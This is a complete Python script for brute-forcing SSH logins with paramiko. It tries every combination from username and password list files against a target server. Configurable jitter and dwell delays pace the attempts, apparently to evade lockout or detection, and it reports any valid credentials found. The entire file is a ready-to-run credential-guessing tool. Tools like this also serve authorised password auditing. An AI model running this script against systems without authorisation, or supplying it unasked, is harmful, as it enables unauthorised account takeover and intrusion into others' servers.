#!/usr/bin/python3
import argparse
from sys import exit as killit
from paramiko import SSHClient, AuthenticationException, SSHException, BadHostKeyException
from colorama import init, Fore
from time import sleep
from os import system

#Initalize colorama
init()
RED = Fore.RED
GREEN = Fore.GREEN
RESET = Fore.RESET
BLUE = Fore.BLUE

def connect(target, test_creds, sleeptime, dwell_time, attempt_num):
    client = SSHClient()
    client.load_system_host_keys()
    # Step through the user:pass combinations
    for var in range(len(test_creds)):
        # Only try to connect the number of attempts
        for i in range(attempt_num):
            # Jitter wait time
            sleep(sleeptime)
            try:
                # SSH Connection test
                client.connect(target, username=test_creds[var][0], password=test_creds[var][1])
                print(f"\n{GREEN}[+] Valid creds: {test_creds[var][0]}:{test_creds[var][1]}{RESET}\n")
                return
            except AuthenticationException:
                # SSH Failed login
                print(f"{RED}[!] Invalid: {test_creds[var][0]}:{test_creds[var][1]}{RESET}")
            except (SSHException, BadHostKeyException) as e:
                # SSH other errors
                print(f"{RED}[!] {e}{RESET}")
        # Dwell between test runs
        sleep(dwell_time)

def main():
    parser = argparse.ArgumentParser()
    requiredNamed = parser.add_argument_group('Required arguments')
    requiredNamed.add_argument('-t', '--target', dest="target", help='SSH Server to test logins', required=True)

    ugroup = parser.add_mutually_exclusive_group(required=True)
    ugroup.add_argument('-u', '--user', dest="user_in", help='Single username')
    ugroup.add_argument('-uL', '--user_list', dest="user_list", help='Username list file.')

    parser.add_argument('-pL', '--pass_list', dest='pass_list', help='Password List.')
    parser.add_argument('-j', '--jitter', dest="jitter_time", help='Time (secs) to wait between login attempts; Default 1 sec')
    parser.add_argument('-a', '--attempts', dest="attempt_num", help='Number of attempts before waiting dwell time')
    parser.add_argument('-d', '--dwell', dest="dwell_time", help='Time (secs) to wait between X attempts')
    args = parser.parse_args()

    # Assigning all variables from input options
    users = []
    if args.user_in:
        users.append(args.user_in)
    elif args.user_list:
        with open(args.user_list, 'r', encoding='utf-8') as f:
            users = [line.strip() for line in f.readlines()]

    with open(args.pass_list, 'r', encoding='utf-8') as f:
        paswords = [line.strip() for line in f.readlines()]

    test_creds = [(x,y) for x in users for y in paswords]
    sleep_time = int(args.jitter_time) if args.jitter_time else 0
    dwell_time = int(args.dwell_time) if args.dwell_time else 0
    attempt_num = int(args.attempt_num) if args.attempt_num else 1
    target = args.target
    banner = """
        █▄▄ █▀█ █░█ ▀█▀ █▀▀ █▀ ▀█▀
        █▄█ █▀▄ █▄█ ░█░ ██▄ ▄█ ░█░
    """

    system('clear')

    # Printing custom timing 
    print(f"\n{banner}\n\n{BLUE}[ ] Jitter time: {sleep_time} seconds\n" +
          f"[ ] Attempt number: {attempt_num}\n" +
          f"[ ] Dwell Time: {dwell_time} seconds{RESET}\n")
    # TEST connection function
    connect(target, test_creds, sleep_time, dwell_time, attempt_num)

if __name__ == '__main__':
    main()
    killit()
